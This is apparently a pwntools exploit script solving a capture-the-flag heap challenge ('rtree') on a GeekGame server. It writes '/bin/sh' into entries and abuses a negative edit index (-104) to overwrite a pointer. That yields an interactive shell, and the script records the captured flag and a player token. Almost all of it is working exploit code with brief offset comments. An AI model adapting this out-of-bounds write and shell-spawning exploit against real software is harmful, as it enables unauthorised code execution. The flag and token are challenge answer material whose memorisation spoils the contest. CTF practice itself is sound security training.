from pwn import *

conn = remote('prob13.geekgame.pku.edu.cn', '10013')
# conn = process('./rtree')
# gdb.attach(proc.pidof(conn)[0])
# 4016a4: start edit
# root = 4040b0

print(conn.recvuntil(b'token: '), end = '>\n')
conn.sendline(b'165:MEQCIAO8Cvf2ewr9c8j2xJV-2MKt019qD2WRxsITgGZxEv-aAiApyfqPGe_LnG5HPuSqMFZzFLumbfL6yfGLiFS2WrnJQw==')

print(conn.recvuntil(b'quit'), end = '>\n')
conn.sendline(b'1')
print(conn.recvuntil(b'key:'), end = '>\n')
conn.sendline(b'1')
print(conn.recvuntil(b'data:'), end = '>\n')
conn.sendline(b'16')
print(conn.recvuntil(b'data:'), end = '>\n')
conn.sendline(b'/bin/sh\x00')
print(conn.recvuntil(b'quit'), end = '>\n')
conn.sendline(b'1')
print(conn.recvuntil(b'key:'), end = '>\n')
conn.sendline(b'2')
print(conn.recvuntil(b'data:'), end = '>\n')
conn.sendline(b'16')
print(conn.recvuntil(b'data:'), end = '>\n')
conn.sendline(b'/bin/sh\x00')
print(conn.recvuntil(b'quit'), end = '>\n')
conn.sendline(b'3')
print(conn.recvuntil(b'edit:'), end = '>\n')
conn.sendline(b'2')
# -7 -6 -5 -4 -3 -2 -1 0-1  2  3-7  8 9
# 9 -> -3 bias = 96
# node.base            data
# 
# H [K, D, S, E, N]  H []   H [...] H []
# K: key, D: dat, S: siz, E: edi, N: nxt

# f2 -> data = 0x00405320
# f1 -> base = 0x004052a0
# f1 -> edit = 0x004052b8
print(conn.recvuntil(b'edit:'), end = '>\n')
conn.sendline(b'-104')
print(conn.recvuntil(b'data:'), end = '>\n')
conn.sendline(b'\xe0\x10\x40\x00\x00\x00\x00\x00')
print(conn.recvuntil(b'quit'), end = '>\n')
# conn.interactive()
conn.sendline(b'3')
print(conn.recvuntil(b'edit:'), end = '>\n')
conn.sendline(b'1')

conn.interactive()
# shell reached
# flag{y0U_Cl1m6d_A_ST3P_H1gh3r_on_Th3_tR33} 

print(conn.recvline())
print(conn.recvline())
print(conn.recvline())
print(conn.recvline())
print(conn.recvline())
print(conn.recvline())
# 

# conn.sendline(b'4')
# conn.sendline(b'ls')
# conn.sendline(b'cat flag.txt')
# conn.sendline(b'cat /flag.txt')
# conn.sendline(b'ls')
# print(conn.recvuntil(b'backdoor!\n'), end = '$\n')
#print(conn.recvline())
#print(conn.recvline())
#print(conn.recvline())
#print(conn.recvline())
#print(conn.recvline())
#print(conn.recvline())
#print(conn.recvline())
#print(conn.recvline())
